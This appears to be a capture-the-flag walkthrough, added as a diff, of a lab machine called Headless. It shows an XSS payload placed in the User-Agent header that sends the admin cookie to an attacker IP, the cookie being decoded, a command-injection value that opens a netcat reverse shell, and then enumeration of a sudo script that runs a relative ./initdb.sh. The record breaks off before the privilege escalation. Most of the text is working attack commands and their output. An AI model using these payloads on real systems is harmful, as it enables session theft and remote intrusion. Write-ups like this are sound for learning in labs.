@@ -1,0 +1,173 @@
+
+
+
+
+
+
+XSS in the User-Agent header.
+
+when inserting a XSS payload such as 
+<script>alert(1)</script>
+in the message body. 
+
+We receive a message that an admin will be alerted to our attempt.
+
+We continue with this in the message body but include another payload in the User-Agent header
+User-Agent: <script>new Image().src='http://10.10.14.37:5000/?ok='+btoa(document.cookie)</script>
+
+
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python xss_rev_server.py --port 5000                  
+Serving on http://0.0.0.0:5000 (CTRL-C to stop)
+10.10.11.8 - - [20/Sep/2025 01:38:36] "GET /?ok=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=' |base64 -d
+is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+we fuzz for and go to /dashboard
+using our cookie
+
+then we notice a simple web request to check server status
+
+date=2023-09-15
+we append our command
+
+date=2023-09-15;nc 10.10.14.37 4444 -e /bin/bash
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.37] from (UNKNOWN) [10.10.11.8] 55836
+whoami
+dvir
+
+dvir@headless:~/app$ ls -lsa
+total 40
+4 drwxr-xr-x 3 dvir dvir 4096 Feb 16  2024 .
+4 drwx------ 8 dvir dvir 4096 Feb 16  2024 ..
+4 -rwxr-xr-x 1 dvir dvir 2867 Sep 10  2023 app.py
+4 -rw-r--r-- 1 dvir dvir 2100 Sep 10  2023 dashboard.html
+4 -rw-r--r-- 1 dvir dvir 1513 Sep  9  2023 hackattempt.html
+4 drwxr-xr-x 2 dvir dvir 4096 Sep 20 10:13 hacking_reports
+4 -rw-r--r-- 1 dvir dvir 2896 Feb 16  2024 index.html
+4 -rw-r--r-- 1 dvir dvir 1185 Feb  2  2024 inspect_reports.py
+4 -rwxr-xr-x 1 dvir dvir   48 Sep  9  2023 report.sh
+4 -rw-r--r-- 1 dvir dvir 2457 Sep  9  2023 support.html
+dvir@headless:~/app$ 
+
+dvir@headless:/$ ls -lsa
+total 76
+ 4 drwxr-xr-x  18 root root  4096 Feb 16  2024 .
+ 4 drwxr-xr-x  18 root root  4096 Feb 16  2024 ..
+ 0 lrwxrwxrwx   1 root root     7 Sep  9  2023 bin -> usr/bin
+ 4 drwxr-xr-x   3 root root  4096 Feb 16  2024 boot
+ 4 drwx------   2 root root  4096 Sep  9  2023 .cache
+ 0 drwxr-xr-x  17 root root  3240 Sep 20 08:00 dev
+12 drwxr-xr-x 120 root root 12288 Sep 20 08:00 etc
+ 4 drwxr-xr-x   3 root root  4096 Sep  9  2023 home
+ 0 lrwxrwxrwx   1 root root    30 Feb 16  2024 initrd.img -> boot/initrd.img-6.1.0-18-amd64
+ 0 lrwxrwxrwx   1 root root    30 Feb 16  2024 initrd.img.old -> boot/initrd.img-6.1.0-18-amd64
+ 0 lrwxrwxrwx   1 root root     7 Sep  9  2023 lib -> usr/lib
+ 0 lrwxrwxrwx   1 root root     9 Sep  9  2023 lib64 -> usr/lib64
+16 drwx------   2 root root 16384 Sep  9  2023 lost+found
+ 4 drwxr-xr-x   3 root root  4096 Sep  9  2023 media
+ 4 drwxr-xr-x   2 root root  4096 Sep  9  2023 mnt
+ 0 dr-xr-xr-x 263 root root     0 Sep 20 07:59 proc
+ 4 drwx------   6 root root  4096 Sep 20 08:00 root
+ 0 drwxr-xr-x  26 root root   740 Sep 20 08:00 run
+ 0 lrwxrwxrwx   1 root root     8 Sep  9  2023 sbin -> usr/sbin
+ 4 drwxr-xr-x   2 root root  4096 Sep  9  2023 srv
+ 0 dr-xr-xr-x  13 root root     0 Sep 20 07:59 sys
+ 4 drwxrwxrwt  13 root root  4096 Sep 20 08:57 tmp
+ 4 drwxr-xr-x  12 root root  4096 Feb 16  2024 usr
+ 4 drwxr-xr-x  11 root root  4096 Sep  9  2023 var
+ 0 lrwxrwxrwx   1 root root    27 Feb 16  2024 vmlinuz -> boot/vmlinuz-6.1.0-18-amd64
+ 0 lrwxrwxrwx   1 root root    27 Feb 16  2024 vmlinuz.old -> boot/vmlinuz-6.1.0-18-amd64
+dvir@headless:/$ 
+
+dvir@headless:/var/mail$ cat dvir
+Subject: Important Update: New System Check Script
+
+Hello!
+
+We have an important update regarding our server. In response to recent compatibility and crashing issues, we've introduced a new system check script.
+
+What's special for you?
+- You've been granted special privileges to use this script.
+- It will help identify and resolve system issues more efficiently.
+- It ensures that necessary updates are applied when needed.
+
+Rest assured, this script is at your disposal and won't affect your regular use of the system.
+
+If you have any questions or notice anything unusual, please don't hesitate to reach out to us. We're here to assist you with any concerns.
+
+By the way, we're still waiting on you to create the database initialization script!
+Best regards,
+Headless
+dvir@headless:/var/mail$ 
+dvir@headless:/var/mail$ sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+dvir@headless:/var/mail$ 
+
+dvir@headless:/var/mail$ cat /usr/bin/syscheck
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+dvir@headless:/var/mail$ 
+dvir@headless:/var/mail$ sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.19, 0.06, 0.01
+Database service is not running. Starting it...
+dvir@headless:/var/mail$ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
